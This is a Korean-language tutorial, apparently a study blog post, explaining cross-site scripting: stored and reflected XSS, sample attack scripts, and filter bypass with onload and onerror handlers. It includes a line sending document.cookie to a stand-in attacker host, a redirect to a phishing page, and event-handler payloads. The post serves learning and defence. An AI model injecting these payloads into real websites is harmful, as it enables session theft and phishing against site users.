## XSS

클라이언트 사이드 취약점 중 하나로, 공격자가 웹 리소스에 악성 스크립트를 삽입해 이용자의 웹 브라우저에 해당 스크립트를 실행할 수 있습니다. 공격자는 해당 취약점을 통해 특정 계정의 세션 정보를 탈취하고 해당 계정으로 임의 기능을 수행할 수 있습니다.
대표적으로 Stored XSS와 Reflected XSS가 있습니다.

<img src="https://velog.velcdn.com/images/silvergun8291/post/3f2faccd-2571-46bf-a3ca-1eba7980daae/image.png">

<br>

## Stored XSS

Stored XSS는 서버의 데이터베이스 또는 파일 등의 형태로 저장된 악성 스크립트를 조회할 때 발생하는 XSS입니다. 대표적으로 게시물과 댓글에 악성 스크립트를 포함해 업로드하는 방식이 있습니다.

<br>

## Reflected XSS

Reflected XSS는 서버가 악성 스크립트가 담긴 요청을 출력할 때 발생합니다. 대표적으로 검색창에서 스크립트를 포함해 검색하는 방식이 있습니다.
Reflected XSS는 Stored XSS와는 다르게 URL과 같은 이용자의 요청에 의해 발생하기 때문에, 타 이용자가 악성 스크립트가 포함된 링크에 접속하도록 유도해야 합니다.

<br>

## XSS 스크립트의 예시

#### 쿠키 및 세션 탈취 공격 코드

```javascript
<script>
// "hello" 문자열 alert 실행.
alert("hello");
// 현재 페이지의 쿠키(return type: string)
document.cookie; 
// 현재 페이지의 쿠키를 인자로 가진 alert 실행.
alert(document.cookie);
// 쿠키 생성(key: name, value: test)
document.cookie = "name=test;";
// new Image() 는 이미지를 생성하는 함수이며, src는 이미지의 주소를 지정. 공격자 주소는 http://hacker.dreamhack.io
// "http://hacker.dreamhack.io/?cookie=현재페이지의쿠키" 주소를 요청하기 때문에 공격자 주소로 현재 페이지의 쿠키 요청함
new Image().src = "http://hacker.dreamhack.io/?cookie=" + document.cookie;
</script>
```

#

#### 페이지 변조 공격 코드

```javascript
<script>
// 이용자의 페이지 정보에 접근.
document;
// 이용자의 페이지에 데이터를 삽입.
document.write("Hacked By DreamHack !");
</script>
```

#

#### 위치 이동 공격 코드

```javascript
<script>
// 이용자의 위치를 변경.
// 피싱 공격 등으로 사용됨.
location.href = "http://hacker.dreamhack.io/phishing"; 
// 새 창 열기
window.open("http://hacker.dreamhack.io/")
</script>
```

<br>


## XSS 필터링 우회

여러 방법중에 이벤트 핸들러 속성을 이용한 방법을 알아보면

### onload 이벤트 핸들러

해당 태그가 요청하는 데이터 로드에 성공하면 이벤트 핸들러를 실행합니다.

```html
<img src="https://dreamhack.io/valid.jpg" onload="alert(document.domain)">
```

데이터 로드가 성공하도록 유도해서 뒤에 코드를 실행시킬 수 있습니다.

#

### onerror 이벤트 핸들러

해당 태그가 요청하는 테이터 로드가 실패하면 이벤트 핸들러를 실행합니다.

```html
<img src="valid.jpg" onerror="alert(document.domain)">
```

데이터 로드가 실패하도록 유도해서 뒤에 코드를 실행시킬 수 있습니다.
